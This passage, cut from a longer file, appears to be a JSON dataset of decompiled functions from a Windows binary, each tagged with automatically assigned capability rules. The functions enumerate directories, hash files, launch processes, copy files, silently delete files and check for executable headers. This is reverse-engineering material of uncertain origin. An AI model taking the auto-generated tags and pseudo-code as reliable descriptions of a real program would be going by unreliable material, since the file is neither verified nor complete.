0x345) = 0x49;\n                            *(ppiVar6 + 0x346) = 0x36;\n                            *(ppiVar6 + 0x347) = 0x34;\n                            *(ppiVar6 + 0xd2) = 0x75;\n                            *(ppiVar6 + 0x349) = 7;\n                            *(ppiVar6 + 0x34a) = 0x25;\n                            *(ppiVar6 + 0x34b) = 0x73;\n                            *(ppiVar6 + 0xd3) = 7;\n                            *(ppiVar6 + 0x34d) = 0;\n                            ppiVar6[7] = ppiVar6[0x5b0];\n                            ppiVar6[5] = ppiVar6[0x126];\n                            ppiVar6[6] = ppiVar6[0x127];\n                            ppiVar6[4] = ppiVar6 + 0xe1;\n                            ppiVar6[3] = ppiVar6[0xd6];\n                            ppiVar6[2] = ppiVar6 + 0x33e;\n                            ppiVar6[1] = 0x1000;\n                            *ppiVar6 = ppiVar6 + 0x129;\n                            ppiVar6[-1] = 0x409db3;\n                            piVar5 = fcn.00419fa8();\n                            ppiVar6[0x5ab] = piVar5;\n                            if (-1 < ppiVar6[0x5ab]) {\n                                iVar2 = ppiVar6[0x5b0][0xc3];\n                                ppiVar6[3] = ppiVar6[0x5ab];\n                                ppiVar6[2] = ppiVar6 + 0x129;\n                                ppiVar6[1] = 0xa9;\n                                *ppiVar6 = iVar2;\n                                ppiVar6[-1] = 0x409dfb;\n                                fcn.00408b8f();\n                                goto code_r0x00409dfb;\n                            }\n                        }\n                        else {\n                            *(ppiVar6 + 0x34e) = 0x25;\n                            *(ppiVar6 + 0x34f) = 100;\n                            *(ppiVar6 + 0xd4) = 7;\n                            *(ppiVar6 + 0x351) = 0x25;\n                            *(ppiVar6 + 0x352) = 0x73;\n                            *(ppiVar6 + 0x353) = 7;\n                            *(ppiVar6 + 0xd5) = 0x25;\n                            *(ppiVar6 + 0x355) = 0x73;\n                            *(ppiVar6 + 0x356) = 7;\n                            *(ppiVar6 + 0x357) = 0;\n                            ppiVar6[5] = ppiVar6[0x5b0];\n                            ppiVar6[4] = ppiVar6 + 0xe1;\n                            ppiVar6[3] = ppiVar6[0xd6];\n                            ppiVar6[2] = ppiVar6 + 0x34e;\n                            ppiVar6[1] = 0x1000;\n                            *ppiVar6 = ppiVar6 + 0x129;\n                            ppiVar6[-1] = 0x409c6c;\n                            piVar5 = fcn.00419fa8();\n                            ppiVar6[0x5ab] = piVar5;\n                            if (-1 < ppiVar6[0x5ab]) {\n                                iVar2 = ppiVar6[0x5b0][0xc3];\n                                ppiVar6[3] = ppiVar6[0x5ab];\n                                ppiVar6[2] = ppiVar6 + 0x129;\n                                ppiVar6[1] = 0xa9;\n                                *ppiVar6 = iVar2;\n                                ppiVar6[-1] = 0x409cb4;\n                                fcn.00408b8f();\n                                goto code_r0x00409dfb;\n                            }\n                        }\n                    }\n                }\n                ppiVar6[1] = ppiVar6 + 0xd6;\n                *ppiVar6 = ppiVar6[0x5aa];\n                ppiVar6[-1] = 0x409ec5;\n                iVar2 = sub.KERNEL32.dll_FindNextFileA();\n                ppiVar7 = ppiVar6 + -2;\n                ppiVar6 = ppiVar6 + -2;\n            } while (iVar2 != 0);\n            *ppiVar7 = ppiVar7[0x5aa];\n            ppiVar7[-1] = 0x409ee2;\n            sub.KERNEL32.dll_FindClose();\n            puVar8 = ppiVar7 + -1;\n        }\n        if (*(puVar8[0x5b0] + 0x308) == 0) {\n            uVar4 = *(puVar8[0x5b0] + 0x30c);\n            puVar8[3] = 0;\n            puVar8[2] = 0;\n            puVar8[1] = 0xaa;\n            *puVar8 = uVar4;\n            puVar8[-1] = 0x409f23;\n            fcn.00408b8f();\n            if (*(puVar8[0x5b0] + 0x310) != '\\0') {\n                *puVar8 = puVar8 + 0x5b0;\n                puVar8[-1] = 0x409f44;\n                fcn.0040b4bf();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 2525
    },
    "00409f53": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00409f53(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uchar auStack2248 [154];\n    uchar auStack2094 [2048];\n    uint8_t auStack46 [16];\n    uint8_t uStack30;\n    uint8_t uStack29;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    fcn.00419918(param_2, 0x41ecc3, param_3);\n    iStack24 = sub.msvcrt.dll_fopen(param_1, 0x41ecc5);\n    if (iStack24 != 0) {\n        fcn.0040fec8(auStack2248);\n        while( true ) {\n            iStack28 = sub.msvcrt.dll_fread(auStack2094, 1, 0x800, iStack24);\n            if ((iStack28 == 0) || (*0x424330 == 0)) break;\n            fcn.0040ff0b(auStack2248, auStack2094, iStack28);\n        }\n        fcn.00410066(auStack46, auStack2248);\n        iStack20 = 0;\n        for (iStack16 = 0; iStack16 < 0x10; iStack16 = iStack16 + 1) {\n            uStack29 = auStack46[iStack16] >> 4;\n            uStack30 = auStack46[iStack16] & 0xf;\n            iVar1 = iStack20 + 1;\n            if (uStack29 < 10) {\n                cVar2 = '0';\n            }\n            else {\n                cVar2 = '7';\n            }\n            *(iStack20 + param_2) = cVar2 + uStack29;\n            iStack20 = iStack20 + 2;\n            if (uStack30 < 10) {\n                cVar2 = '0';\n            }\n            else {\n                cVar2 = '7';\n            }\n            *(iVar1 + param_2) = cVar2 + uStack30;\n        }\n        *(param_2 + param_3 + -1) = 0;\n        sub.msvcrt.dll_fclose(iStack24);\n    }\n    return;\n}\n",
        "token_count": 528
    },
    "0040a146": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.0040a146(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t **ppiVar6;\n    int32_t **ppiVar7;\n    uint *puVar8;\n    ulong uVar9;\n    uchar auStack20 [4];\n    int32_t aiStack16 [2];\n    \n    aiStack16[1] = 0x40a152;\n    iVar2 = fcn.0041ce38();\n    iVar2 = -iVar2;\n    *(&stack0x000018e4 + iVar2) = 0;\n    if (*(*(&stack0x000018f8 + iVar2) + 0x204) == 0) {\n        *(&stack0x00000000 + iVar2) = 0x204;\n        *(&stack0xfffffffc + iVar2) = *(&stack0x000018f8 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = &stack0x000004b7 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x40a196;\n        uVar3 = fcn.00419918();\n        *(&stack0x000018e4 + iVar2) = uVar3;\n        if (((&stack0x000004b6)[*(&stack0x000018e4 + iVar2) + iVar2] == '\\\\') ||\n           ((&stack0x000004b6)[*(&stack0x000018e4 + iVar2) + iVar2] == '/')) {\n            (&stack0x000004b6)[*(&stack0x000018e4 + iVar2) + iVar2] = 0;\n        }\n        *(&stack0xfffffff8 + iVar2) = &stack0x000004b7 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x40a1ea;\n        cVar1 = fcn.0040aa34();\n        if (cVar1 != '\\0') {\n            *(&stack0x00000000 + iVar2) = 0x104;\n            *(&stack0xfffffffc + iVar2) = &stack0x000003b3 + iVar2;\n            *(&stack0xfffffff8 + iVar2) = &stack0x000004b7 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x40a214;\n            fcn.0041a73f();\n            *(&stack0x00000000 + iVar2) = 0x204;\n            *(&stack0xfffffffc + iVar2) = &stack0x000016dc + iVar2;\n            *(&stack0xfffffff8 + iVar2) = &stack0x000004b7 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x40a236;\n            fcn.0041a682();\n            *(&stack0x00000000 + iVar2) = 0x21;\n            *(&stack0xfffffffc + iVar2) = &stack0x000006bb + iVar2;\n            *(&stack0xfffffff8 + iVar2) = &stack0x000004b7 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x40a258;\n            fcn.00409f53();\n            (&stack0x00000255)[iVar2] = 0x25;\n            (&stack0x00000256)[iVar2] = 100;\n            (&stack0x00000257)[iVar2] = 7;\n            (&stack0x00000258)[iVar2] = 0x25;\n            (&stack0x00000259)[iVar2] = 0x73;\n            (&stack0x0000025a)[iVar2] = 7;\n            (&stack0x0000025b)[iVar2] = 0x25;\n            (&stack0x0000025c)[iVar2] = 0x49;\n            (&stack0x0000025d)[iVar2] = 0x36;\n            (&stack0x0000025e)[iVar2] = 0x34;\n            (&stack0x0000025f)[iVar2] = 0x75;\n            (&stack0x00000260)[iVar2] = 7;\n            (&stack0x00000261)[iVar2] = 0x25;\n            (&stack0x00000262)[iVar2] = 0x73;\n            (&stack0x00000263)[iVar2] = 7;\n            (&stack0x00000264)[iVar2] = 0x25;\n            (&stack0x00000265)[iVar2] = 0x73;\n            (&stack0x00000266)[iVar2] = 7;\n            (&stack0x00000267)[iVar2] = 0;\n            *(&stack0xfffffff8 + iVar2) = &stack0x000004b7 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x40a2ff;\n            uVar9 = fcn.0040ac70();\n            *(&stack0x00000018 + iVar2) = &stack0x000006bb + iVar2;\n            *(&stack0x00000014 + iVar2) = &stack0x000016dc + iVar2;\n            *(&stack0x0000000c + iVar2) = uVar9;\n            *(&stack0x00000010 + iVar2) = uVar9 >> 0x20;\n            *(&stack0x00000008 + iVar2) = &stack0x000003b3 + iVar2;\n            *(&stack0x00000004 + iVar2) = 0;\n            *(&stack0x00000000 + iVar2) = &stack0x00000255 + iVar2;\n            *(&stack0xfffffffc + iVar2) = 0x1000;\n            *(&stack0xfffffff8 + iVar2) = &stack0x000006dc + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x40a352;\n            uVar3 = fcn.00419fa8();\n            *(&stack0x000018e4 + iVar2) = uVar3;\n            if (0 < *(&stack0x000018e4 + iVar2)) {\n                uVar3 = *(*(&stack0x000018f8 + iVar2) + 0x208);\n                *(&stack0x00000004 + iVar2) = *(&stack0x000018e4 + iVar2);\n                *(&stack0x00000000 + iVar2) = &stack0x000006dc + iVar2;\n                *(&stack0xfffffffc + iVar2) = 0xe1;\n                *(&stack0xfffffff8 + iVar2) = uVar3;\n                *(&stack0xfffffff4 + iVar2) = 0x40a396;\n                fcn.00408b8f();\n            }\n            *(&stack0xfffffff8 + iVar2) = 0x32;\n            *(&stack0xfffffff4 + iVar2) = 0x40a3a2;\n            fcn.0040b294();\n            uVar3 = *(*(&stack0x000018f8 + iVar2) + 0x208);\n            *(&stack0x00000004 + iVar2) = 0;\n            *(&stack0x00000000 + iVar2) = 0;\n            *(&stack0xfffffffc + iVar2) = 0xe2;\n            *(&stack0xfffffff8 + iVar2) = uVar3;\n            *(&stack0xfffffff4 + iVar2) = 0x40a3cf;\n            fcn.00408b8f();\n            if (*(*(&stack0x000018f8 + iVar2) + 0x20d) == '\\0') {\n                return;\n            }\n            *(&stack0xfffffff8 + iVar2) = &stack0x000018f8 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x40a3f4;\n            fcn.0040b4bf();\n            return;\n        }\n    }\n    *(&stack0xfffffff8 + iVar2) = 0x8003;\n    *(&stack0xfffffff4 + iVar2) = 0x40a406;\n    sub.KERNEL32.dll_SetErrorMode();\n    *(&stack0x00000000 + iVar2) = *(&stack0x000018f4 + iVar2);\n    *(&stack0xfffffffc + iVar2) = 0x41ecb4;\n    *(&stack0xfffffff8 + iVar2) = 0x204;\n    *(&stack0xfffffff4 + iVar2) = &stack0x000016d8 + iVar2;\n    *(&stack0xfffffff0 + iVar2) = 0x40a433;\n    iVar4 = fcn.00419fa8();\n    if (-1 < iVar4) {\n        *(&stack0xfffffff8 + iVar2) = &stack0x00000264 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = &stack0x000016d8 + iVar2;\n        *(&stack0xfffffff0 + iVar2) = 0x40a455;\n        uVar3 = sub.KERNEL32.dll_FindFirstFileA();\n        puVar8 = &stack0xffffffec + iVar2;\n        *(&stack0x000018d4 + iVar2) = uVar3;\n        ppiVar6 = &stack0xffffffec + iVar2;\n        if (*(&stack0x000018d4 + iVar2) != -1) {\n            do {\n                ppiVar7 = ppiVar6;\n                if (*0x424330 == 0) break;\n                ppiVar6[1] = 0x41ecb8;\n                *ppiVar6 = ppiVar6 + 0xa7;\n                ppiVar6[-1] = 0x40a494;\n                iVar2 = fcn.0041a1d8();\n                if (iVar2 != 0) {\n                    ppiVar6[1] = 0x41ecba;\n                    *ppiVar6 = ppiVar6 + 0xa7;\n                    ppiVar6[-1] = 0x40a4b6;\n                    iVar2 = fcn.0041a1d8();\n                    if (iVar2 != 0) {\n                        if ((ppiVar6[0x9c] & 0x10) == 0) {\n                            ppiVar6[0xec] = ppiVar6[0xa4];\n                            ppiVar6[0xed] = ppiVar6[0xa3];\n                            ppiVar6[4] = ppiVar6 + 0xa7;\n                            ppiVar6[3] = ppiVar6[0x640];\n                            ppiVar6[2] = 0x41ecc8;\n                            ppiVar6[1] = 0x204;\n                            *ppiVar6 = ppiVar6 + 0x4bf;\n                            ppiVar6[-1] = 0x40a693;\n                            fcn.00419fa8();\n                            ppiVar6[2] = 0x21;\n                            ppiVar6[1] = ppiVar6 + 0x6c3;\n                            *ppiVar6 = ppiVar6 + 0x4bf;\n                            ppiVar6[-1] = 0x40a6b5;\n                            fcn.00409f53();\n                            *(ppiVar6 + 0x90) = 0x25;\n                            *(ppiVar6 + 0x241) = 100;\n                            *(ppiVar6 + 0x242) = 7;\n                            *(ppiVar6 + 0x243) = 0x25;\n                            *(ppiVar6 + 0x91) = 0x73;\n                            *(ppiVar6 + 0x245) = 7;\n                            *(ppiVar6 + 0x246) = 0x25;\n                            *(ppiVar6 + 0x247) = 0x49;\n                            *(ppiVar6 + 0x92) = 0x36;\n                            *(ppiVar6 + 0x249) = 0x34;\n                            *(ppiVar6 + 0x24a) = 0x75;\n                            *(ppiVar6 + 0x24b) = 7;\n                            *(ppiVar6 + 0x93) = 0x25;\n                            *(ppiVar6 + 0x24d) = 0x73;\n                            *(ppiVar6 + 0x24e) = 7;\n                            *(ppiVar6 + 0x24f) = 0x25;\n                            *(ppiVar6 + 0x94) = 0x73;\n                            *(ppiVar6 + 0x251) = 7;\n                            *(ppiVar6 + 0x252) = 0;\n                            ppiVar6[8] = ppiVar6 + 0x6c3;\n                            ppiVar6[7] = ppiVar6[0x640];\n                            ppiVar6[5] = ppiVar6[0xec];\n                            ppiVar6[6] = ppiVar6[0xed];\n                            ppiVar6[4] = ppiVar6 + 0xa7;\n                            ppiVar6[3] = ppiVar6[0x9c];\n                            ppiVar6[2] = ppiVar6 + 0x90;\n                            ppiVar6[1] = 0x1000;\n                            *ppiVar6 = ppiVar6 + 0x1b9;\n                            ppiVar6[-1] = 0x40a7b6;\n                            piVar5 = fcn.00419fa8();\n                            ppiVar6[0x63b] = piVar5;\n                            if (-1 < ppiVar6[0x63b]) {\n                                iVar2 = ppiVar6[0x640][0x82];\n                                ppiVar6[3] = ppiVar6[0x63b];\n                                ppiVar6[2] = ppiVar6 + 0x1b9;\n                                ppiVar6[1] = 0xe1;\n                                *ppiVar6 = iVar2;\n                                ppiVar6[-1] = 0x40a7fa;\n                                fcn.00408b8f();\n                            }\n                        }\n                        else {\n                            *(ppiVar6 + 0x253) = 0x25;\n                            *(ppiVar6 + 0x95) = 100;\n                            *(ppiVar6 + 0x255) = 7;\n                            *(ppiVar6 + 0x256) = 0x25;\n                            *(ppiVar6 + 599) = 0x73;\n                            *(ppiVar6 + 0x96) = 7;\n                            *(ppiVar6 + 0x259) = 0x25;\n                            *(ppiVar6 + 0x25a) = 0x73;\n                            *(ppiVar6 + 0x25b) = 7;\n                            *(ppiVar6 + 0x97) = 0;\n                            ppiVar6[5] = ppiVar6[0x640];\n                            ppiVar6[4] = ppiVar6 + 0xa7;\n                            ppiVar6[3] = ppiVar6[0x9c];\n                            ppiVar6[2] = ppiVar6 + 0x253;\n                            ppiVar6[1] = 0x1000;\n                            *ppiVar6 = ppiVar6 + 0x1b9;\n                            ppiVar6[-1] = 0x40a568;\n                            piVar5 = fcn.00419fa8();\n                            ppiVar6[0x63b] = piVar5;\n                            if (-1 < ppiVar6[0x63b]) {\n                                iVar2 = ppiVar6[0x640][0x82];\n                                ppiVar6[3] = ppiVar6[0x63b];\n                                ppiVar6[2] = ppiVar6 + 0x1b9;\n                                ppiVar6[1] = 0xe1;\n                                *ppiVar6 = iVar2;\n                                ppiVar6[-1] = 0x40a5b0;\n                                fcn.00408b8f();\n                                if (*(ppiVar6[0x640] + 0x83) != '\\0') {\n                                    ppiVar6[4] = ppiVar6 + 0xa7;\n                                    ppiVar6[3] = ppiVar6[0x640];\n                                    ppiVar6[2] = 0x41ecbd;\n                                    ppiVar6[1] = 0x204;\n                                    *ppiVar6 = ppiVar6 + 0xc;\n                                    ppiVar6[-1] = 0x40a5fb;\n                                    fcn.00419fa8();\n                                    ppiVar6[0x8d] = ppiVar6[0x640][0x81] + 1;\n                                    ppiVar6[0x8e] = ppiVar6[0x640][0x82];\n                                    *(ppiVar6 + 0x8f) = 1;\n                                    *ppiVar6 = ppiVar6 + 0xc;\n                                    ppiVar6[-1] = 0x40a63a;\n                                    fcn.0040a146();\n                                }\n                            }\n                        }\n                    }\n                }\n                ppiVar6[1] = ppiVar6 + 0x9c;\n                *ppiVar6 = ppiVar6[0x63a];\n                ppiVar6[-1] = 0x40a81d;\n                iVar2 = sub.KERNEL32.dll_FindNextFileA();\n                ppiVar7 = ppiVar6 + -2;\n                ppiVar6 = ppiVar6 + -2;\n            } while (iVar2 != 0);\n            *ppiVar7 = ppiVar7[0x63a];\n            ppiVar7[-1] = 0x40a83a;\n            sub.KERNEL32.dll_FindClose();\n            puVar8 = ppiVar7 + -1;\n        }\n        if (*(puVar8[0x640] + 0x204) == 0) {\n            uVar3 = *(puVar8[0x640] + 0x208);\n            puVar8[3] = 0;\n            puVar8[2] = 0;\n            puVar8[1] = 0xe2;\n            *puVar8 = uVar3;\n            puVar8[-1] = 0x40a87b;\n            fcn.00408b8f();\n            if (*(puVar8[0x640] + 0x20d) != '\\0') {\n                *puVar8 = puVar8 + 0x640;\n                puVar8[-1] = 0x40a89c;\n                fcn.0040b4bf();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 4290
    },
    "0040a8af": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040a8af(uint param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar auStack100 [16];\n    uint auStack84 [11];\n    uint uStack40;\n    ushort uStack36;\n    uint uStack16;\n    \n    uStack16 = 0;\n    fcn.0041a59f(auStack84, 0, 0x44);\n    auStack84[0] = 0x44;\n    if (param_3 == 0) {\n        uStack40 = 1;\n        uStack36 = 0;\n        uStack16 = 0x8000000;\n    }\n    fcn.0041a59f(auStack100, 0, 0x10);\n    uVar2 = 0;\n    iVar1 = sub.KERNEL32.dll_CreateProcessA(param_1, param_2, 0, 0, 0, uStack16, 0, 0, auStack84, auStack100);\n    if (iVar1 != 0) {\n        sub.KERNEL32.dll_CloseHandle(uVar2);\n        sub.KERNEL32.dll_CloseHandle(uVar2);\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "0040aaaa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar fcn.0040aaaa(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char cStack17;\n    uint32_t uStack16;\n    \n    cStack17 = '\\0';\n    iVar1 = sub.msvcrt.dll_fopen(param_1, 0x41ecc5);\n    if (iVar1 == 0) {\n        return '\\0';\n    }\n    iVar2 = sub.msvcrt.dll_fopen(param_2, 0x41eccd);\n    if (iVar2 == 0) goto code_r0x0040abd6;\n    for (uStack16 = 0x8000; 0x7f < uStack16; uStack16 = uStack16 >> 1) {\n        iVar3 = sub.msvcrt.dll_calloc(uStack16, 1);\n        if (iVar3 != 0) goto code_r0x0040ab33;\n    }\n    goto code_r0x0040abca;\n    while (iVar5 = sub.msvcrt.dll_fwrite(iVar3, 1, iVar4, iVar2),  iVar5 == iVar4) {\ncode_r0x0040ab33:\n        iVar4 = sub.msvcrt.dll_fread(iVar3, 1, uStack16, iVar1);\n        if (iVar4 < 1) {\n            if (((*(iVar1 + 0xc) & 0x20) == 0) && ((*(iVar1 + 0xc) & 0x10) != 0)) {\n                cStack17 = '\\x01';\n            }\n            else {\n                cStack17 = '\\0';\n            }\n            break;\n        }\n    }\n    sub.msvcrt.dll_free(iVar3);\ncode_r0x0040abca:\n    sub.msvcrt.dll_fclose(iVar2);\ncode_r0x0040abd6:\n    sub.msvcrt.dll_fclose(iVar1);\n    if (cStack17 != '\\x01') {\n        fcn.0040a9af(param_2);\n    }\n    return cStack17;\n}\n",
        "token_count": 480
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0040ace1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar fcn.0040ace1(uint param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char acStack540 [516];\n    char *pcStack24;\n    char cStack18;\n    char cStack17;\n    char *pcStack16;\n    \n    uVar2 = sub.msvcrt.dll_strlen(param_1);\n    if (uVar2 < 0x204) {\n        fcn.00419918(acStack540, param_1, 0x204);\n        cStack18 = '\\\\';\n        cStack17 = '\\x01';\n        pcStack16 = acStack540;\n        while ((cStack17 != '\\0' && (pcStack24 = fcn.00419ecc(pcStack16, cStack18),  pcStack24 != NULL))) {\n            if (pcStack24 != pcStack16) {\n                *pcStack24 = '\\0';\n                cVar1 = fcn.0040aa6f(acStack540);\n                if (cVar1 != '\\x01') {\n                    cStack17 = fcn.0040acbe(acStack540);\n                }\n                *pcStack24 = cStack18;\n            }\n            pcStack16 = pcStack24 + 1;\n        }\n    }\n    else {\n        cStack17 = '\\0';\n    }\n    return cStack17;\n}\n",
        "token_count": 291
    },
    "0040adee": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0040adee(uint param_1)\n\n{\n    char cVar1;\n    uint unaff_retaddr;\n    uint uStack54;\n    uint uStack50;\n    uint uStack46;\n    uint uStack42;\n    ushort uStack38;\n    uint uStack36;\n    uint uStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t iStack16;\n    \n    iStack16 = sub.msvcrt.dll_strlen(param_1);\n    iStack16 = iStack16 + 2;\n    uStack20 = sub.msvcrt.dll_calloc(iStack16, 1);\n    sub.msvcrt.dll_memset(uStack20, 0, iStack16);\n    sub.msvcrt.dll_strcpy(uStack20, param_1);\n    uStack54 = 0;\n    uStack50 = 3;\n    uStack46 = uStack20;\n    uStack42 = 0x41ecd0;\n    uStack38 = 0x414;\n    uStack36 = 0;\n    uStack32 = 0;\n    iStack28 = 0x41ecd0;\n    iStack28 = sub.SHELL32.DLL_SHFileOperationA(&uStack54);\n    sub.msvcrt.dll_free(uStack24);\n    if ((iStack28 == 0) && (cVar1 = fcn.0040aa6f(unaff_retaddr),  cVar1 != '\\x01')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 338
    },
    "0040aed7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0040aed7(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iStack8;\n    int32_t iStack4;\n    \n    iVar1 = sub.KERNEL32.dll_GetModuleFileNameA(0, param_1, param_2);\n    if ((iVar1 < 1) || (iStack4 <= iVar1)) {\n        fcn.0041a59f(iStack8, 0, iStack4);\n        uVar2 = 0;\n    }\n    else {\n        *(iStack8 + iVar1) = 0;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 156
    },
    "0040b20d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.0040b20d(uint param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uStack20;\n    int32_t iStack16;\n    \n    iStack16 = sub.msvcrt.dll_fopen(param_1, 0x41ecc5);\n    if (iStack16 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        iVar2 = sub.msvcrt.dll_fread(&uStack20, 1, 4, iStack16);\n        if (iVar2 == 4) {\n            sub.msvcrt.dll_fclose(iStack16);\n            uVar1 = uStack20 & 0xff00 | (uStack20 & 0xffff) == 0x5a4d;\n        }\n        else {\n            sub.msvcrt.dll_fclose(iStack16);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 213
    },
    "0040b2ab": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool fcn.0040b2ab(uint param_1, uint param_2)\n\n{\n    bool bVar1;\n    uchar auStack20 [4];\n    int32_t iStack16;\n    \n    iStack16 = sub.msvcrt.dll__beginthreadex(0, 0, param_1, param_2, 0, auStack20);\n    bVar1 = iStack16 != 0;\n    if (bVar1) {\n        sub.KERNEL32.dll_CloseHandle(iStack16);\n    }\n    return bVar1;\n}\n",
        "token_count": 120
    },
    "0040b30c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0040b30c(uint param_1, int32_t param_2, int32_t *param_3)\n\n{\n    int32_t iVar1;\n    int32_t aiStack44 [3];\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iStack16 = 0;\n    iStack32 = 0;\n    *param_3 = 0;\n    iStack20 = sub.msvcrt.dll_fopen(param_1, 0x41ecd4);\n    if (iStack20 != 0) {\n        iVar1 = fcn.0040b542(iStack20, 0, 0, 2);\n        if (iVar1 == 0) {\n            iStack28 = iStack20;\n            iVar1 = sub.msvcrt.dll_fgetpos(iStack20, aiStack44);\n            if (iVar1 != 0) {\n                aiStack44[0] = -1;\n            }\n            iStack16 = aiStack44[0];\n            if (0 < aiStack44[0]) {\n                if ((param_2 < aiStack44[0]) && (param_2 != 0)) {\n                    iStack16 = param_2;\n                }\n                iVar1 = fcn.0040b542(iStack20, 0, 0, 0);\n                if ((iVar1 == 0) && (iStack32 = sub.msvcrt.dll_malloc(iStack16),  iStack32 != 0)) {\n                    iStack24 = sub.msvcrt.dll_fread(iStack32, 1, iStack16, iStack20);\n                    if (iStack24 != iStack16) {\n                        iStack32 = sub.msvcrt.dll_realloc(iStack32, iStack24);\n                        iStack16 = iStack24;\n                    }\n                    sub.msvcrt.dll_fclose(iStack20);\n                    *param_3 = iStack16;\n                    return iStack32;\n                }\n            }\n        }\n        sub.msvcrt.dll_fclose(iStack20);\n        if (iStack32 != 0) {\n            fcn.0040b4bf(&iStack32);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 502
    },
    "0040b51d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040b51d(int32_t param_1)\n\n{\n    if ((param_1 != 0) && (0 < param_1)) {\n        sub.KERNEL32.dll_FreeLibrary(param_1);\n    }\n    return;\n}\n",
        "token_count": 55
    },
